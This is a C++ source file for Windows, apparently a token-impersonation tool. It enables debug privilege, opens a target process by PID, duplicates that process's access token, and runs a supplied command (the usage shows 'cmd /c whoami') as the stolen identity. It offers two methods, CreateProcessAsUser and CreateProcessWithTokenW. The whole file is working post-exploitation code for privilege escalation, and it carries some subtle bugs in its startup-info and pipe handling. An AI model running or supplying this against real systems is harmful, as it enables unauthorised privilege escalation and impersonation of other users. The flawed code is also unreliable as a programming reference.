#include <iostream>
#include <tchar.h>
#include <windows.h>

#define PipeBufSize 4096

PCTSTR pCmdPipeName = TEXT("\\\\.\\pipe\\myCmdPipe");

BOOL EnablePrivilege(PCWSTR lpName, HANDLE hToken) {
    LUID lpLuid;
    TOKEN_PRIVILEGES tkp;
    if (hToken == NULL) {
       BOOL bRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
       if (!bRet) {
           return FALSE;
       }
    }
   
    if (!LookupPrivilegeValue(NULL, lpName, &lpLuid))
    {
        CloseHandle(hToken);
        return false;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = lpLuid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {
        CloseHandle(hToken);
        return false;
    }
    return true;
}

HANDLE getProcessToken(DWORD pid) {
    EnablePrivilege(SE_DEBUG_NAME, NULL);
    HANDLE hProc;
    HANDLE hProcToken;
    HANDLE hDstToken;

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProc == NULL) {
        _tprintf(TEXT("[!]OpenProcess Error: %d\n"), GetLastError());
        return FALSE;
    }

    if (!OpenProcessToken(
        hProc, 
        TOKEN_DUPLICATE |
        TOKEN_ASSIGN_PRIMARY |
        TOKEN_QUERY | TOKEN_IMPERSONATE, 
        &hProcToken)) {
        _tprintf(TEXT("[!]OpenProcessToken Error: %d\n"), GetLastError());
        return FALSE;
    }

    if (!DuplicateTokenEx(hProcToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDstToken)) {
        _tprintf(TEXT("DuplicateTokenEx Error: %d\n"), GetLastError());
        return FALSE;
    }

    return hDstToken;
}


BOOL ExecViaCreateProcessAsUser(HANDLE hDstToken, PTSTR szCommand) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    si.cb = sizeof(&si);
    RtlZeroMemory(&si, sizeof(si));
    RtlZeroMemory(&pi, sizeof(pi));

    HANDLE hPipe = CreateNamedPipe(
        pCmdPipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE,
        PIPE_UNLIMITED_INSTANCES,
        PipeBufSize,
        PipeBufSize,
        0,
        NULL
    );
    si.hStdOutput = hPipe;
    si.hStdError = hPipe;

    EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, hDstToken);
    EnablePrivilege(SE_INCREASE_QUOTA_NAME, hDstToken);
    EnablePrivilege(SE_IMPERSONATE_NAME, hDstToken);
    if (!ImpersonateLoggedOnUser(hDstToken)) {
        _tprintf(TEXT("[!]ImpersonateLoggedOnUser Error: %d\n"), GetLastError());
        return FALSE;
    }



    //TCHAR strCommandLine[1024] = TEXT("cmd /c tasklist");
    WCHAR ReadBuf[PipeBufSize] = { 0 };
    DWORD dwRead;

    if (!CreateProcessAsUser(
        hDstToken,
        NULL,
        szCommand,
        NULL,
        NULL,
        TRUE,
        NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        _tprintf(TEXT("CreateProcessAsUser Error: %d\n"), GetLastError());
        return FALSE;
    }

    //https://blog.csdn.net/ktpd_pro/article/details/70049800

    while (true) {
        if (ReadFile(hPipe, ReadBuf, PipeBufSize, &dwRead, NULL) == NULL) {
            break;
        }
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(hPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    _tprintf(TEXT("%s\n"), ReadBuf);
    _tprintf(TEXT("--------------------------\n"));

    return TRUE;
}

BOOL ExecViaCreateProcessWithToken(HANDLE hDstToken, PTSTR szCommand) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    si.cb = sizeof(&si);
    RtlZeroMemory(&si, sizeof(si));
    RtlZeroMemory(&pi, sizeof(pi));

    HANDLE hPipe = CreateNamedPipe(
        pCmdPipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE,
        PIPE_UNLIMITED_INSTANCES,
        PipeBufSize,
        PipeBufSize,
        0,
        NULL
    );
    si.hStdOutput = hPipe;
    si.hStdError = hPipe;
    WCHAR ReadBuf[PipeBufSize] = { 0 };
    DWORD dwRead;
    //EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, hDstToken);
    //EnablePrivilege(SE_INCREASE_QUOTA_NAME, hDstToken);

    EnablePrivilege(SE_IMPERSONATE_NAME, hDstToken);
    if (!ImpersonateLoggedOnUser(hDstToken)) {
        _tprintf(TEXT("[!]ImpresonateLoggedOnUser Error: %d\n"), GetLastError());
        return FALSE;
    }

    if (!CreateProcessWithTokenW(
        hDstToken,
        LOGON_WITH_PROFILE,
        NULL,
        szCommand,
        0, //replace with CREATE_NO_WINDOW
        NULL, 
        NULL,
        &si,
        &pi)) {
    
        _tprintf(TEXT("[!] CreateProcessWithToken Error: %d\n"), GetLastError());
        return FALSE;
    }

    while (true) {
        if (ReadFile(hPipe, ReadBuf, PipeBufSize, &dwRead, NULL) == NULL) {
            break;
        }
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(hPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    _tprintf(TEXT("%s\n"), ReadBuf);
    _tprintf(TEXT("[+] CreateProcessWithTokenW OK\n"));

    return TRUE;
}


int _tmain(int argc, _TCHAR* argv[])
{
    if (argc != 4) {
        _tprintf(TEXT("Usage: %s 1 <pid> \"cmd /c whoami\"\n"), argv[0]);
        _tprintf(TEXT("Usage: %s 2 <pid> \"cmd\"\n"), argv[0]);
        return 1;
    }
    PTSTR pStr;
    
    DWORD pid = (DWORD)wcstod(argv[2], &pStr);
    PTSTR szCommand = (PTSTR)argv[3];

    HANDLE hDstToken = NULL;
    hDstToken = getProcessToken(pid);
    if (!hDstToken) {
        _tprintf(TEXT("[!] getProcessToken Error: %d\n"), GetLastError());
        return 1;
    }
  
    if ((DWORD)wcstod(argv[1], &pStr) == 1) {
        if (!ExecViaCreateProcessAsUser(hDstToken, szCommand)) {
  
      _tprintf(TEXT("[!] Exec Via CreateProcessAsUser Error: %d\n"), GetLastError());
      return 1;
        }
  
    }

    if ((DWORD)wcstod(argv[1], &pStr) == 2) {
        if (!ExecViaCreateProcessWithToken(hDstToken, szCommand)) {

            _tprintf(TEXT("[!] Exec Via CreateProcessAsUser Error: %d\n"), GetLastError());
            return 1;
        }
    }   

}
